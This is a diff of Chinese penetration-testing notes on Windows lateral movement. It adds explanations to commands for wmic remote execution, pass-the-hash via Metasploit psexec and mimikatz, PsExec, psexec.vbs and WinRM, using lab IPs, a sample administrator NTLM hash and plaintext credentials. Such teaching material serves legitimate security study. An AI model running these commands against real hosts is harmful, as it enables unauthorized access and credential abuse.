@@ -188,12 +188,14 @@ Winrm 5985(HTTP)&5986(HTTPS)
 wmic /node:192.168.1.158 /user:pt007 /password:admin123  process call create "cmd.exe /c ipconfig>d:\result.txt"
 ```
 ### 2.使用Hash直接登录Windows（HASH传递）:
+Metasploit Framework（MSF）是一个开源的渗透测试工具，它包含了各种渗透测试工具和漏洞利用模块。其中，psexec模块用于在Windows系统上执行远程命令。在Metasploit中使用psexec模块进行HASH传递，你需要有一个有效的Hash值，通常是NTLM哈希。  
 抓取windows hash值,得到administrator的hash：
-598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF  
+598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
 ```bash
 msf调用payload：
 use exploit/windows/smb/psexec
 show options
+#设置目标主机的IP地址、NTLM哈希、用户名等参数
 set RHOST 192.168.81.129
 set SMBPass 598DDCE2660D3193AAD3B435B51404EE:2D20D252A479F485CDF5E171D93985BF
 set SMBUser Administrator
@@ -209,25 +211,34 @@ mimikatz.exe privilege::debug "sekurlsa::pth /user:administrator /domain:. /ntlm
 dir \\192.168.1.185\c$
 ```
 ### 4.WMIcmd执行命令,有回显：
+`wmic` 是 `Windows Management Instrumentation Command-line` 工具，它允许通过命令行执行 WMI 查询和操作。
 ```bash
 WMIcmd.exe -h 192.168.1.152 -d hostname -u pt007 -p admin123 -c "ipconfig"
 ```
 程序下载地址：
 https://github.com/nccgroup/WMIcmd/releases
 ### 5.Cobalt strkie远程执行命令与hash传递攻击:
+Cobalt Strike是一款超级好用的渗透测试工具，拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等多种功能。可以参考学习[Cobalt Strike](https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html)。  
 ### 6.psexec.exe远程执行命令:
-需要下载 Sysinternals 工具包，其中包含 PsExec。你可以从 [Microsoft 官方网站](https://learn.microsoft.com/zh-cn/sysinternals/downloads/)上下载 Sysinternals Suite。将下载的 PsExec.exe 文件放置在系统的 PATH 目录中，或者在命令行中直接指定 PsExec.exe 的完整路径。
+需要下载 Sysinternals 工具包，其中包含 PsExec。你可以从 [Microsoft 官方网站](https://learn.microsoft.com/zh-cn/sysinternals/downloads/)上下载 Sysinternals Suite。将下载的 PsExec.exe 文件放置在系统的 PATH 目录中，或者在命令行中直接指定 PsExec.exe 的完整路径。  
 ```bash
 psexec /accepteula //接受许可协议
 sc delete psexesvc
 # psexec \\目标计算机 -u 用户名 -p 密码 命令
 # 目标计算机: 目标计算机的名称或 IP 地址。-u 用户名: 用于身份验证的用户名。
-#-p 密码: 用户名对应的密码。命令: 要在远程系统上执行的命令。
+# -p 密码: 用户名对应的密码。
+# 命令: 要在远程系统上执行的命令。
 psexec \\192.168.1.185 -u pt007 -p admin123 cmd.exe
 ```
 ### 7.psexec.vbs远程执行命令:
+`psexec.vbs` 是 Sysinternals 工具套件中的一个脚本，用于远程执行命令。下载 Sysinternals 工具包后，到包含 psexec.vbs 的文件夹：  
 ```bash
-cscript psexec.vbs 192.168.1.158 pt007 admin123 "ipconfig"
+# cscript psexec.vbs \\RemoteComputer -u Username -p Password command
+# RemoteComputer: 替换为目标远程计算机的名称或 IP 地址。
+# -u Username: 替换为目标计算机上具有执行权限的用户名。
+# -p Password: 替换为指定用户名的密码。
+# command: 替换为要在远程计算机上执行的命令。
+cscript psexec.vbs 192.168.1.158 -u pt007 -p admin123 "ipconfig"
 ```
 ### 8.winrm远程执行命令:
 Windows 远程管理服务（WinRM）是 Microsoft 提供的用于在 Windows 系统上进行远程管理的服务。WinRM 使用了标准的 Web 服务协议（HTTP 和 HTTPS）来提供远程管理。你可以使用 PowerShell 或其他工具通过 WinRM 在远程系统上执行命令。  
